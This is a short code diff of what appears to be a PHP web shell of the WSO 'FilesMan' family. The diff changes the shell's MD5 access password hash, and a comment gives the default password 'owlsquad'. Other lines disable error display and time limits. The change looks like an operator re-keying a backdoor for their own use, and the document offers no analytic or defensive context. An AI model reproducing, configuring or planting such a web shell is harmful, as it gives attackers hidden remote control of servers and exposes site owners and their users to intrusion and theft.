@@ -17,7 +17,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
  
-$auth_pass = "eefa4c97682302bcffb509d9d20d9f0d"; // default: owlsquad
+$auth_pass = "d7b6e9d219bded316d298ce3ca4071ce"; // default: owlsquad
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
